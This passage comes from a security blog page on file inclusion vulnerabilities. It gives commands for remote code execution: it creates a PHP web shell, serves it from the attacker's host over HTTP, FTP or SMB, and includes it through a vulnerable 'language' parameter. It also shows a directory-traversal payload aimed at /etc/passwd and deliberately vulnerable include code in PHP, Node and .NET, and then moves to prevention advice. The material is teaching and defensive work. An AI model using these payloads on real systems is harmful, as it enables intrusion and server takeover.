+<h3 id="RCE-via-HTTP"><a href="#RCE-via-HTTP" class="headerlink" title="RCE via HTTP"></a>RCE via HTTP</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create shell</span></span><br><span class="line">echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start listener</span></span><br><span class="line">sudo python3 -m http.server 8000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Include remote shell</span></span><br><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://&lt;OUR_IP&gt;:8000/shell.php&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+<h3 id="RCE-via-FTP"><a href="#RCE-via-FTP" class="headerlink" title="RCE via FTP"></a>RCE via FTP</h3><p>Useful when HTTP is blocked by firewall&#x2F;WAF:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start FTP server</span></span><br><span class="line">sudo python -m pyftpdlib -p 21</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Include via FTP</span></span><br><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://&lt;OUR_IP&gt;/shell.php&amp;cmd=id</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">With credentials</span></span><br><span class="line">curl &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://user:pass@localhost/shell.php&amp;cmd=id&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="RCE-via-SMB-Windows-targets"><a href="#RCE-via-SMB-Windows-targets" class="headerlink" title="RCE via SMB (Windows targets)"></a>RCE via SMB (Windows targets)</h3><p>Does NOT require <code>allow_url_include</code>:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start SMB server</span></span><br><span class="line">impacket-smbserver -smb2support share $(pwd)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Include via UNC path</span></span><br><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\&lt;OUR_IP&gt;\share\shell.php&amp;cmd=whoami</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Second-Order-Attacks"><a href="#Second-Order-Attacks" class="headerlink" title="Second-Order Attacks"></a>Second-Order Attacks</h2><p>Poisoning database entries to trigger LFI indirectly:</p>
+<p><strong>Example:</strong> Malicious username like <code>../../../etc/passwd</code>, later used in avatar path:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/profile/$username/avatar.png → /profile/../../../etc/passwd/avatar.png</span><br></pre></td></tr></table></figure>
+
+<p>Developers often trust database values more than direct user input.</p>
+<hr>
+<h2 id="Vulnerable-Code-Examples"><a href="#Vulnerable-Code-Examples" class="headerlink" title="Vulnerable Code Examples"></a>Vulnerable Code Examples</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Vulnerable</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;language&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;language&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// With directory prefix</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./languages/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;language&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// With extension appended</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;language&#x27;</span>] . <span class="string">&quot;.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fs.readFile</span></span><br><span class="line"><span class="keyword">if</span>(req.<span class="property">query</span>.<span class="property">language</span>) &#123;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(path.<span class="title function_">join</span>(__dirname, req.<span class="property">query</span>.<span class="property">language</span>), <span class="keyword">function</span> (<span class="params">err, data</span>) &#123;</span><br><span class="line">        res.<span class="title function_">write</span>(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// res.render</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/about/:language&quot;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">`/<span class="subst">$&#123;req.params.language&#125;</span>/about.html`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h3><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">@if (!<span class="built_in">string</span>.IsNullOrEmpty(HttpContext.Request.Query[<span class="string">&#x27;language&#x27;</span>])) &#123;</span><br><span class="line">    &lt;% Response.WriteFile(<span class="string">&quot;&lt;% HttpContext.Request.Query[&#x27;language&#x27;] %&gt;&quot;</span>); %&gt; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Html.Partial(HttpContext.Request.Query[<span class="string">&#x27;language&#x27;</span>])</span><br><span class="line"></span><br><span class="line">&lt;!--<span class="meta">#include file=&quot;&lt;% HttpContext.Request.Query[&#x27;language&#x27;] %&gt;&quot;--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="3-Prevention"><a href="#3-Prevention" class="headerlink" title="3. Prevention"></a>3. Prevention</h1><h2 id="Input-Validation-Sanitization"><a href="#Input-Validation-Sanitization" class="headerlink" title="Input Validation &amp; Sanitization"></a>Input Validation &amp; Sanitization</h2><ul>
+<li><strong>Never pass user-controlled input</strong> directly to file inclusion functions</li>
+<li>Dynamically load assets on the back-end without user interaction</li>
+<li>Validate inputs against a strict whitelist of allowed values</li>
+</ul>
+<h2 id="Prevent-Directory-Traversal"><a href="#Prevent-Directory-Traversal" class="headerlink" title="Prevent Directory Traversal"></a>Prevent Directory Traversal</h2><p>Attackers with directory control can:</p>
+<ul>
+<li>Read <code>/etc/passwd</code> for SSH keys and usernames</li>
+<li>Access service configs like <code>tomcat-users.xml</code></li>
+<li>Hijack PHP sessions</li>
+<li>Read application source code and configuration</li>
+</ul>
+<h2 id="Web-Server-Configuration"><a href="#Web-Server-Configuration" class="headerlink" title="Web Server Configuration"></a>Web Server Configuration</h2><h3 id="PHP-Configuration-php-ini"><a href="#PHP-Configuration-php-ini" class="headerlink" title="PHP Configuration (php.ini)"></a>PHP Configuration (<code>php.ini</code>)</h3><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable remote file inclusion</span></span><br><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">Off</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">Off</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Restrict to web directory</span></span><br><span class="line"><span class="attr">open_basedir</span> = /var/www</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable dangerous modules</span></span><br><span class="line"><span class="comment">; extension=expect</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Containerization"><a href="#Containerization" class="headerlink" title="Containerization"></a>Containerization</h3><p>Run applications within <strong>Docker</strong> to isolate filesystem access.</p>
+<h3 id="Disable-Dangerous-Modules"><a href="#Disable-Dangerous-Modules" class="headerlink" title="Disable Dangerous Modules"></a>Disable Dangerous Modules</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.expect.php">PHP Expect</a></li>
+<li><a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/mod/mod_userdir.html">mod_userdir</a></li>
+</ul>
+<h2 id="Web-Application-Firewall-WAF"><a href="#Web-Application-Firewall-WAF" class="headerlink" title="Web Application Firewall (WAF)"></a>Web Application Firewall (WAF)</h2><ul>
+<li>Use <strong>ModSecurity</strong> or similar WAF</li>
+<li>Start with <strong>permissive mode</strong> to avoid false positives</li>
+<li>Use as early warning system for attacks</li>
+<li>Average detection time without proper hardening: <strong>30 days</strong> (FireEye M-Trends 2020)</li>
+</ul>
+<hr>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters">HackTricks LFI Guide</a></li>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion">OWASP RFI Testing Guide</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo">LFI2RCE via phpinfo</a></li>
+</ul>
+
+											<div class="article-footer-copyright">
+
+</div>
+
+							</div>
+
+							
+									
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+-->
+											
+													
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+
+					
+
+
+			</div><!-- row -->
+
+			<!--
+ -->
+
+
+			<!-- Fixed TOC Container for hexo-toc.js -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  <a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script>
+<script src="/js/hexo-toc.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript">
+    (function ($) {
+      $('.fancybox').fancybox();
+    })(jQuery);
+  </script>
+  
+
+    
+      <script type="text/javascript">
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+          search_path = "search.xml";
+        }
+        var path = "/" + search_path;
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      </script>
+      
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
